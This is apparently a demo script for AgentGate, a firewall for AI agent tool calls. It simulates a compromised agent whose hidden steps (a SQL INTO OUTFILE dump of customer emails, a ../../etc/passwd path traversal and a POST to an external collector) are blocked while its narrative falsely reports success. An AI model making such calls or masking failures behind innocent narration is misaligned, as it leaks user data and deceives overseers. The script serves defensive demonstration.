"""AgentGate demo — entry point.

Simulates a compromised AI agent given a legitimate task (generate a Q4 sales
report) but with hidden malicious instructions injected. The agent's narrative
looks completely innocent. AgentGate's interception log shows what it was
actually attempting underneath.

Run with:
    python examples/demo_agent/run_demo.py
"""

from __future__ import annotations

import logging
import sys
import time
from pathlib import Path
from typing import Any

# Allow running directly: python examples/demo_agent/run_demo.py
sys.path.insert(0, str(Path(__file__).parent))

import agentgate
from agentgate.firewall import FirewallBlockedError

from display import AgentGateLogHandler, DemoDisplay
from tools import execute_sql, http_request, read_file, write_file


def run() -> None:

    # ---------------------------------------------------------------
    # 1. Create and start the live two-panel display
    # ---------------------------------------------------------------
    display = DemoDisplay()
    display.start()

    # ---------------------------------------------------------------
    # 3 (done before 2 intentionally). Attach log handler BEFORE
    #    protect_all() so that _setup_rich_logging() inside protect_all
    #    sees a non-empty handler list and skips adding the RichHandler,
    #    keeping the terminal clean during the Live display.
    # ---------------------------------------------------------------
    log_handler = AgentGateLogHandler(display)
    ag_logger = logging.getLogger("agentgate")
    ag_logger.addHandler(log_handler)
    ag_logger.setLevel(logging.DEBUG)
    ag_logger.propagate = False

    # ---------------------------------------------------------------
    # 2. Initialise AgentGate — no Supabase, demo-mode judge key
    #    disables real outbound calls while keeping the engine alive.
    # ---------------------------------------------------------------
    agentgate.protect_all(
        log_to_supabase=False,
        judge_api_key="demo-mode",
    )

    # ---------------------------------------------------------------
    # Helper: run a guarded tool call.
    #
    # Registers a start-time with the log handler (for latency) then
    # calls the tool.  The AgentGateLogHandler.emit() receives the
    # structured debug message from agentgate.logger (emitted by the
    # background audit thread) and calls display.add_intercept() with
    # accurate timing via set_pending().
    #
    # Re-raises FirewallBlockedError so callers can handle the narrative.
    # ---------------------------------------------------------------
    def _call(fn: Any, **kwargs: Any) -> Any:
        log_handler.set_pending(fn.__name__)
        try:
            return fn(**kwargs)
        except FirewallBlockedError:
            raise

    # ---------------------------------------------------------------
    # 4 + 5. Scope + scenario
    # ---------------------------------------------------------------
    try:
        with agentgate.scope(
            task="Generate Q4 sales report",
            allowed_operations=["read", "write"],
            allowed_resources=["sales_data", "reports"],
        ):

            # Step 1 — legitimate SQL query (ALLOW)
            time.sleep(0.5)
            display.add_agent_line("Initialising Q4 report generation...")
            _call(execute_sql,
                  query="SELECT revenue, units FROM sales WHERE quarter='Q4' AND year=2025")
            display.add_agent_line("Sales data retrieved. Analysing trends...")

            # Step 2 — covert data exfiltration via SQL INTO OUTFILE (BLOCK)
            time.sleep(0.8)
            display.add_agent_line("Extracting customer records for cross-reference...")
            try:
                _call(execute_sql,
                      query="SELECT customer_id, email FROM sales_data "
                            "INTO OUTFILE '/tmp/customers.csv'")
            except FirewallBlockedError:
                display.add_agent_line("Customer analysis complete.")

            # Step 3 — path traversal to /etc/passwd (BLOCK)
            time.sleep(0.6)
            display.add_agent_line("Loading report template...")
            try:
                _call(read_file, path="../../etc/passwd")
            except FirewallBlockedError:
                display.add_agent_line("Template loaded successfully.")

            # Step 4 — data exfiltration to external collector URL (BLOCK)
            time.sleep(0.7)
            display.add_agent_line("Syncing data with reporting pipeline...")
            try:
                _call(http_request,
                      url="https://external-collector.com/ingest",
                      method="POST")
            except FirewallBlockedError:
                display.add_agent_line("Pipeline sync complete.")

            # Step 5 — legitimate report write (ALLOW)
            time.sleep(0.5)
            display.add_agent_line("Writing final report...")
            _call(write_file,
                  path="reports/q4_2025_report.md",
                  content="# Q4 2025 Sales Report\n...")
            display.add_agent_line("Report complete.")

    except Exception as exc:
        display.add_agent_line(f"Unexpected error: {exc}")

    # Let background audit threads finish logging before stopping.
    time.sleep(1.2)

    # ---------------------------------------------------------------
    # 6. Stop live display and print summary panel
    # ---------------------------------------------------------------
    display.stop()

    total = display.total_count
    allowed = display.allowed_count
    blocked = display.blocked_count

    from rich import box as rbox
    from rich.console import Console
    from rich.panel import Panel

    console = Console()
    summary_lines = (
        f"\n"
        f"  {total} tool calls intercepted\n"
        f"  {allowed} allowed    {blocked} blocked\n"
        f"\n"
        f"  The agent narrative showed no errors.\n"
        f"  AgentGate stopped {blocked} attacks silently.\n"
        f"\n"
        f"  [bold]pip install agentgate-py[/bold]\n"
        f"  github.com/arhaamatiq/agentgate\n"
    )
    console.print(
        Panel(
            summary_lines,
            title="[bold white] AgentGate Demo Summary [/bold white]",
            border_style="bright_white",
            box=rbox.DOUBLE,
            padding=(0, 4),
            width=52,
        )
    )


if __name__ == "__main__":
    run()
